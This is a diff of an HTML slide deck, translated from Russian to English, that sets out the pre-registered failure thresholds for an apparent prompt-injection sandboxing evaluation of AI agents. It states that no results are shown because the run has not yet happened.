+      <p class="thesis sm">We do not solve prompt injection. We reduce the attack surface to zero where a shell
+      used to be, and we make everything else visible.</p>
+      <p class="thesis sm">We do not make an attack impossible. We raise its cost and guarantee that it leaves
+      a trace.</p>
     </div>
     <div class="card flat">
-      <h3>Что честно считать провалом — пороги зафиксированы до прогона</h3>
+      <h3>What honestly counts as failure — thresholds fixed before the run</h3>
       <ul class="list">
-        <li><i>✕</i><span>корпус атак пробивается через аргументы, пути или вывод</span></li>
-        <li><i>✕</i><span>типовые задачи требуют больше <b>5 %</b> исключений</span></li>
-        <li><i>✕</i><span>ложные блокировки выше <b>5 %</b></span></li>
-        <li><i>✕</i><span>baseline <code>none</code> показывает ASR, близкий к seatbelt-режиму</span></li>
+        <li><i>✕</i><span>the attack corpus gets through via arguments, paths, or output</span></li>
+        <li><i>✕</i><span>typical tasks require more than <b>5%</b> exceptions</span></li>
+        <li><i>✕</i><span>false blocks exceed <b>5%</b></span></li>
+        <li><i>✕</i><span>the <code>none</code> baseline shows an ASR close to seatbelt mode</span></li>
       </ul>
-      <p class="note">Цифр ASR и Utility на слайдах нет намеренно: прогона не было.
-      Подгонять пороги после замера — значит не проводить эксперимент.</p>
+      <p class="note">ASR and Utility numbers are deliberately absent from these slides: the run hasn't happened.
+      Adjusting the thresholds after the measurement means you're not running an experiment.</p>
     </div>
   </div>
 </section>
 
 <footer class="footer">
-  <span>Источник истины — <code>docs/</code>, слайды производные</span>
+  <span>Source of truth — <code>docs/</code>; slides are derived</span>
   <span><a class="lnk" href="https://modelcontextprotocol.io/specification/draft/basic/security_best_practices">MCP · Security Best Practices</a></span>
   <span>CVE-2025-54136</span>
   <span>OWASP ASI01 · ASI04 · ASI05</span>
-  <span><code>@anthropic-ai/sandbox-runtime@0.0.74</code> — пробы П1–П11</span>
+  <span><code>@anthropic-ai/sandbox-runtime@0.0.74</code> — probes П1–П11</span>
 </footer>
 
 <script>
